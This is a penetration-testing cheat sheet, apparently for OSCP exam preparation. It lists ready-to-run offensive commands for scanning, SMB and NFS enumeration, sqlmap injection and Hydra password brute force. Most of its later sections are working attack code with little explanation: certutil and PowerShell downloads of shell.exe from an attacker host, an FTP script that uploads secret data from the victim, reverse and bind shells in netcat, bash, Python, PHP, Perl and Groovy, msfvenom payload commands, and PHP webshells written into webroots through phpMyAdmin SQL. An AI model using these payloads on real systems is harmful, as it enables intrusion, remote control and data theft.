                          Initial Fast TCP Scan                                 
================================================================================

```
nmap -v -sS -sV -Pn --top-ports 1000 -oA initial_scan_192.168.0.1 192.168.0.1
```

                               Full TCP Scan                            
========================================================================

```
nmap -v -sS -Pn -sV -p 0-65535 -oA full_scan_192.168.0.1 192.168.0.1
```

                           Limited Full TCP Scan                          
==========================================================================

If the syn scan is taking very long to complete, the following command is an alternative (no service detection).

```
nmap -sT -p- --min-rate 5000 --max-retries 1 192.168.0.1
```

                            Top 100 UDP Scan                              
==========================================================================

```
nmap -v -sU -T4 -Pn --top-ports 100 -oA top_100_UDP_192.168.0.1 192.168.0.1
```

                           Full Vulnerability scan                                     
=======================================================================================

```
nmap -v -sS  -Pn --script vuln --script-args=unsafe=1 -oA full_vuln_scan_192.168.0.1 192.168.0.1
```

                            Vulners Vulnerability Script                                           
===================================================================================================

```
nmap -v -sS  -Pn --script nmap-vulners $IP
```

                           SMB Vulnerabitlity Scan                                
==================================================================================

```
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 $IP
```

                             NBTSCAN                                          
==============================================================================

```
nmap -sV $IP --script nbstat.nse -v
```

####Gobuster
####HTTP
####Fast Scan (Small List)

```
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirb/big.txt -t 20
```

Fast Scan (Big List)

```
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```

Slow Scan (Check File Extensions)

```
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20
```

HTTPS

Set the --insecuressl flag.
SMBCLIENT

To fix NT_STATUS_CONNECTION_DISCONNECTED errors in new Kali installations add client min protocol = NT1 to your \etc\samba\smb.conf file.
List Shares (As Guest)

```
smbclient -U guest -L 192.168.0.1
```

Connect to A Share (As User John)

```
smbclient \\\\192.168.0.1\\Users -U c.smith
```

Download All Files From A Directory Recursively

```
smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'
```

example:
```
smbclient \\\\192.168.0.1\\Data -U John -c 'prompt OFF;recurse ON;cd '\Users\John\';lcd '/tmp/John';mget *'
```

Alternate File Streams
List Streams

```
smbclient \\\\192.168.0.1\\Data -U John -c 'allinfo "\Users\John\file.txt"'
```

Download Stream By Name (:SECRET)

```
smbclient \\\\192.168.0.1\\Data -U John

get "\Users\John\file.txt:SECRET:$DATA"
```

Enum4Linux
Scan Host

```
enum4linux 192.168.0.1
```

Scan Host, Suppress Errors

```
enum4linux 192.168.0.1 | grep -Ev '^(Use of)' > enum4linux.out 
```

NFS
Show mountable drives

```
showmount -e 192.168.0.1
```

Mount Drive

mkdir mpt
```
mount -t nfs -o soft 192.168.0.1:/backup mpt/
```

# WebApp Paths

https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md

# SQLMAP

DISCLAIMER: There are a number of tools you are not allowed to use in your OSCP exam. At the time of writing, sqlmap is one of them. Check which tools are restricted/banned before you use them during your exam. You can find detailed information about tool usage in the exam guidelines.
Get Request
Test All (Default Settings)

```
sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch
```

Test All (Default Settings, High Stress)

```
sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch --level=5 --risk=3
```

Post Request (Capture with BURP)
Test All (Default Settings)

```
sqlmap --all -r post_request.txt --batch 
```

Test All (Default Settings, High Stress)

```
sqlmap --all -r post_request.txt --batch --level=5 --risk=3
```

Get A Reverse Shell (MySQL)

```
sqlmap -r post_request.txt --dbms "mysql" --os-shell
```

Brute Force
Hydra
HTTP Basic Authentication

```
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /phpmyadmin/ -t 15
```

HTTP Get Request

```
hydra 192.168.0.1 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15
```

HTTP Post Request

Check request in BURP to see Post parameters. -l or -L has to be set, even if there is no user to login with!. Use https-post-form instead of http-post-form for HTTPS sites.

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t 15
```

MYSQL

Change MYDATABASENAME. Default databasename is mysql.

```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15
```

File Transfer
Powershell
As Cmd.exe Command

```
powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')
```

Encode Command for Transfer

Very helpful for chars that need to be escaped otherwise.

```
$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1:80/ftp.txt","C:\Windows\temp\ftp.txt")' 
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 
powershell.exe -NoProfile -encoded $Encoded
```

Certutil
Download

```
certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe
```

Download & Execute Python Command

```
os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe & C:\Windows\Temp\shell.exe')
```

SMB
Start Impacket SMB Server (With SMB2 Support)

```
impacket-smbserver -smb2support server_name /var/www/html
```

List Drives (Execute on Victim)

```
net view \\192.168.0.1
```

Copy Files (Execute on Victim)

```
copy \\192.168.0.1\server_name\shell.exe shell.exe
```

PureFTP
Install

```
apt-get update && apt-get install pure-ftpd
```

Create setupftp.sh Execute The Script

```
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd myftpuser -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

./setupftp.sh

Get Service Ready
Reset Password

```
pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd
```

Commit Changes

```
pure-pw mkdb
```

Restart Service

```
/etc/init.d/pure-ftpd restart 
```

Create FTP Script (On Victim)

```
echo open 192.168.0.1>> ftp.txt
echo USER myftpuser>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo put secret_data.txt>> ftp.txt
echo bye >> ftp.txt
```

Execute Script (on Victim)

```
ftp -v -n -s:ftp.txt
```

Netcat
Receiving Shell

```
nc -l -p 1234 > out.file
```

Sending Shell

```
nc -w 3 192.168.0.1 1234 < out.file
```

TFTP
Start TFTP Daemon (Folder /var/tftp)

```
atftpd --daemon --port 69 /var/tftp
```

Transfer Files

```
tftp -i 192.168.0.1 GET whoami.exe
```

VBScript
Create wget.vbs File

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Download Files

```
cscript wget.vbs http://192.168.0.1/nc.exe nc.exe
```

Shells
Upgrade Your Shell (TTY Shell)

```
python -c 'import pty;pty.spawn("/bin/bash");' 
```

Enable Tab-Completion

    In your active shell press bg to send your nc session to background
    Enter stty raw -echo
    Enter fg to bring your nc session to foreground
    Enter export TERM=xterm-256color

Catching Reverse Shells (Netcat)

rlwrap enables the usage of arrow keys in your shell. https://github.com/hanslub42/rlwrap

```
rlwrap nc -nlvp 4444
```

Netcat
Reverse Shell
Unix

Victim:

```
nc 192.168.0.1 4444 -e /bin/bash
```

If -e is not allowed, try to find other versions of netcat

- /bin/nc
- /usr/bin/ncat
- /bin/netcat
- /bin/nc.traditional

Attacker:

```
rlwrap nc -nlvp 4444
```

Windows

```
nc 192.168.0.1 4444 -e cmd.exe
```

Bind shell
Unix

Victim:

```
nc -nlvp 4444 -e /bin/bash
```

Attacker:

```
nc 192.168.0.1 4444
```

Windows

Victim:

```
nc -nlvp 4444 -e cmd.exe
```

Attacker:

```
nc 192.168.0.1 4444
```

Bash
Reverse Shell

```
/bin/bash -i >& /dev/tcp/192.168.0.1/4433 0>&1
```

Python
As Command (Reverse Shell)

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Python Code (Reverse Shell)

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

PHP
Kali Default PHP Reverse Shell

```
cat /usr/share/webshells/php/php-reverse-shell.php
```

Kali Default PHP CMD Shell

```
cat /usr/share/webshells/php/php-backdoor.php
```

PHP Reverse Shell

Version 1:

```
<?php echo shell_exec("/bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1");?>
```

Version 2:

```
<?php $sock=fsockopen("192.168.0.1", 4444);exec("/bin/sh -i <&3 >&3 2 >& 3");?>
```

As Command:

```
php -r '$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

CMD Shell

```
<?php echo system($_REQUEST["cmd"]); ?>
```

Call the CMD shell:

http://192.168.0.1/cmd_shell.php?cmd=whoami

WhiteWinterWolf Webshell

https://github.com/WhiteWinterWolf/wwwolf-php-webshell
MSFVENOM
Windows Binary (.exe)
32 Bit (x86)

Reverse Shell:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```

Bind Shell:

```
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe
```

Output in Hex, C Style, Exclude bad chars, Exitfunction thread:

```
msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

64 Bit (x64)

Reverse Shell:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```

Bind Shell:

```
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe
```

Meterpreter:

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```

Linux Binary (.elf)
32 Bit (x86)

Reverse Shell:

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
```

Bind Shell:

```
msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf > bind_shell.elf
```

64 Bit (x64)

Reverse Shell:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
```

Bind Shell:

```
msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf > rev_shell.elf
```

Java Server Pages (.jsp)

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw > shell.jsp
```

As .war:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f war -o shell.war
```

Active Sever Pages Extended (.aspx)

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx
```

Active Sever Pages Extended (.aspx)
Transfer A File (Certutil)

```
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

Execute a File

```
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

Jenkins / Groovy (Java)
Linux Reverse Shell

```
String host="192.168.0.1";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Windows Reverse Shell

```
String host="192.168.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Perl
Reverse Shell

```
perl -MIO -e 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

PhpmyAdmin

Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)

Windows:

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

Unix:

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
```


                      Directory Fuzzing                      
=============================================================

```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt --hc 404  "$URL"
```

```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt --hc 404 --hh 999  "$URL" 
```

```
dirb "$URL" /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt 
```

```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  "$URL"
```

```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404  "$URL"
```


                     Sub domain Enum                       
===========================================================

```
findomain -t "$URL" -q
```

```
subfinder -d "$URL"
```

                     URL CRAWL/ Discovery                     
==============================================================

```
echo "$URL" | waybackurls| httpx-pd -silent > link.txt
```

                             Shell Stabilize                          
======================================================================

```
python -c 'import pty; pty.spawn("/bin/bash")'
```
OR
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```

